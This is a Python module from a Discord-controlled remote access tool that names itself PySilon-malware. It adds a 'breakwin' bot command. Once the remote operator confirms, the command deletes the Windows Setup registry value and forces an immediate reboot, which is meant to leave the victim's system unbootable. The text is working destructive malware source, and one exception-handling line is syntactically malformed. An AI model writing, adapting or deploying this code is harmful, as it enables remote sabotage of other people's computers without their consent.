#<imports>
import subprocess
import asyncio
#</imports>

@client.command(name='breakwin')
async def break_windows(ctx):
    await ctx.message.delete()
    try:
        if IsAdmin():
            embed = discord.Embed(title="🟣 System",description='Are you sure you want to completely break Windows?',colour=discord.Colour.purple())
            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('✅'); await reaction_msg.add_reaction('❌')
            def win_break_confirm(reaction, user):
                    return str(reaction.emoji) in ['✅', '❌'] and user == ctx.author
            try:
                reaction, user = await client.wait_for('reaction_add', check=win_break_confirm)
                if str(reaction.emoji) == '✅':
                    embed = discord.Embed(title="🟢 Executing",description='Break Windows will now be executed. Bye bye!',colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                    subprocess.run(['reg', 'delete', 'HKLM\\SYSTEM\\Setup', '/v', 'SetupType', '/f'], check=True)
                    subprocess.run(['shutdown', '/r', '/f', '/t', '0'], check=True)
                else: return await ctx.send("```❗ Cancelled by user.```")
            except: asyncio.TimeoutError: await ctx.send("```❗ Reaction listener has timed out.```")
        else:
            embed = discord.Embed(title="📛 Error",description='Script is not running as admin!',colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    except:
        embed = discord.Embed(title="📛 Error",description="An error occurred during windows break", colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)